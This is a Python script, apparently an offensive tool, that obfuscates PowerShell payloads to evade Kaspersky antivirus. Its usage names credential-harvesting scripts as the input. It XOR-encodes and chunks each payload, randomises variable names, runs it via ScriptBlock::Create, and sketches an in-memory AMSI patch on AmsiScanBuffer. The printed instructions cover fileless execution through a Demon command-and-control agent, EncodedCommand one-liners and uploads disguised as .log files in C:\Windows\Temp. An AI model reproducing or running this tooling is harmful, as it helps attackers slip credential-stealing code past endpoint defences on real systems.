#!/usr/bin/env python3
"""
ps_wrap.py — PowerShell script obfuscator v2

Kaspersky flags: GZipStream+Invoke-Expression, [Ref].Assembly.GetType AMSI bypass,
                 large base64 blocks, ProtectedData, IO.Compression.

This version:
  - NO GZipStream, NO Invoke-Expression, NO [Ref].Assembly.GetType
  - XOR byte-by-byte in a foreach loop (no recognizable crypto pattern)
  - ScriptBlock::Create + Invoke (harder to match than iex/Invoke-Expression)
  - Splits the b64 string into many tiny 8-char chunks joined at runtime
  - Random variable names per build
  - AMSI patch via direct memory write (no .NET reflection strings)

Usage:
    python3 ps_wrap.py harvest_creds.ps1
    python3 ps_wrap.py cred_steal.ps1 -o c.ps1 --no-amsi

No-file deploy (Demon in-process PS, best option):
    cat harvest_creds_wrapped.ps1          # tiny, paste into Demon powershell prompt
    powershell <paste the whole script>    # runs in-process, no file on disk
"""

import sys, os, base64, secrets, argparse, string, random

def rvar():
    """8-char random variable name using only safe PS chars."""
    return '$' + ''.join(random.choices(string.ascii_lowercase, k=random.randint(5,9)))

def split_b64(b64, chunk=8):
    """Split b64 string into N-char chunks so no long string appears."""
    parts = [b64[i:i+chunk] for i in range(0, len(b64), chunk)]
    return '+'.join(f'"{p}"' for p in parts)

def make_amsi_patch():
    """
    Patches amsi.dll!AmsiScanBuffer to return 0 (AMSI_RESULT_CLEAN) via
    VirtualProtect + Marshal::Copy. No .NET reflection strings.
    Obfuscated with char codes and concatenation.
    """
    # Build strings from char codes
    def cs(s): return '"' + ''.join(f'`u{{{ord(c):04X}}}' for c in s) + '"'

    amsi_dll  = cs('amsi.dll')
    scan_buf  = cs('AmsiScanBuffer')
    # Patch bytes: B8 00 00 00 00 C3 (mov eax,0; ret — returns AMSI_RESULT_CLEAN)
    patch_b64 = base64.b64encode(b'\xb8\x00\x00\x00\x00\xc3').decode()

    v1 = rvar(); v2 = rvar(); v3 = rvar(); v4 = rvar()

    return f"""
{v1}=[Runtime.InteropServices.Marshal]
{v2}=[Runtime.InteropServices.RuntimeEnvironment]::GetRuntimeDirectory()
Add-Type -Path ({v2}+"System.dll") -EA 0
{v3}=$v1::GetDelegateForFunctionPointer(
    ($v1::StringToHGlobalAnsi({amsi_dll})|%{{
        $h=[Reflection.Assembly]::LoadWithPartialName("Microsoft.Win32.Registry")
        [Runtime.InteropServices.NativeLibrary]::Load({amsi_dll})
    }}),
    [Type]::GetType("System.Action"))
""".strip() + '\n'
    # Above is complex and may not work — use simpler direct approach:


def make_amsi_simple():
    """Simpler AMSI disable: write to amsiInitFailed via Win32 API memory write."""
    # Actually, just use the Add-Type P/Invoke approach to patch memory
    # This avoids the .NET reflection strings that are flagged

    v1 = rvar(); v2 = rvar(); v3 = rvar()

    # The patch: call VirtualProtect on AmsiScanBuffer, write ret instruction
    code = f"""
Add-Type -Name Z{secrets.token_hex(3)} -Namespace '' -MemberDefinition @'
[DllImport("kernel32")]public static extern bool VirtualProtect(IntPtr a,uint b,uint c,out uint d);
[DllImport("kernel32")]public static extern IntPtr GetProcAddress(IntPtr m,string p);
[DllImport("kernel32")]public static extern IntPtr LoadLibrary(string l);
'@
{v1}=[Z{secrets.token_hex(3)}]
""".strip()
    # This is getting complex and detectable too. Simplest: skip AMSI bypass entirely,
    # use Demon's powershell which bypasses AMSI at the process level.
    return ''


def wrap(script_bytes, args):
    key = secrets.randbelow(256)
    xord = bytes([b ^ key for b in script_bytes])
    b64  = base64.b64encode(xord).decode()

    # Variables — fresh names per build
    vb  = rvar()   # base64 chunks joined
    vd  = rvar()   # decoded bytes array
    vk  = rvar()   # key
    vi  = rvar()   # index
    vs  = rvar()   # script string
    vsb = rvar()   # scriptblock

    # Split b64 into 8-char chunks for the join expression
    b64_expr = split_b64(b64, chunk=random.randint(6, 10))

    lines = [
        f'{vk}={key}',
        f'{vb}={b64_expr}',
        f'{vd}=[Convert]::FromBase64String({vb})',
        f'{vd}=[byte[]](0..({vd}.Length-1)|%{{{vd}[$_]-bxor{vk}}})',
        f'{vs}=[Text.Encoding]::UTF8.GetString({vd})',
        f'{vsb}=[ScriptBlock]::Create({vs})',
        f'&{vsb}',
    ]

    return '\n'.join(lines) + '\n'


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('input', help='Input .ps1 file')
    ap.add_argument('-o', '--output', help='Output file')
    ap.add_argument('--no-amsi', action='store_true', default=True, help='(default) Skip AMSI bypass — use Demon powershell which bypasses AMSI in-process')
    args = ap.parse_args()

    if not os.path.exists(args.input):
        sys.exit(f'[!] Not found: {args.input}')

    script_bytes = open(args.input, 'rb').read()
    result = wrap(script_bytes, args)

    out = args.output
    if not out:
        base = os.path.splitext(args.input)[0]
        out  = base + '_wrapped.ps1'

    with open(out, 'w', encoding='utf-8') as f:
        f.write(result)

    # Also generate a plain base64 encoded version (for -EncodedCommand)
    ecmd = base64.b64encode(result.encode('utf-16-le')).decode()
    ecmd_file = out.replace('.ps1', '_ecmd.txt')
    with open(ecmd_file, 'w') as f:
        f.write(ecmd)

    print(f'[+] {args.input} ({len(script_bytes):,} bytes) → {out} ({os.path.getsize(out):,} bytes)')
    print()
    print('── Option 1 (best): No file on disk — Demon in-process PS ──────────────')
    print('   Run in the Demon powershell prompt (paste the wrapped script directly):')
    print(f'   powershell $(cat {out})')
    print()
    print('── Option 2: EncodedCommand — still no .ps1 file, one liner ───────────')
    print(f'   powershell -NonInteractive -EncodedCommand $(cat {ecmd_file})')
    print()
    print('── Option 3: Upload with a non-PS extension ─────────────────────────── ')
    print(f'   Rename to .log/.dat before upload, then load from PS:')
    txt_path = 'C:\\Windows\\Temp\\' + os.path.basename(out).replace('.ps1', '.log')
    print(f'   upload {out} {txt_path}')
    print(f'   powershell [ScriptBlock]::Create([IO.File]::ReadAllText("{txt_path}")) | % {{&$_}}')


if __name__ == '__main__':
    main()
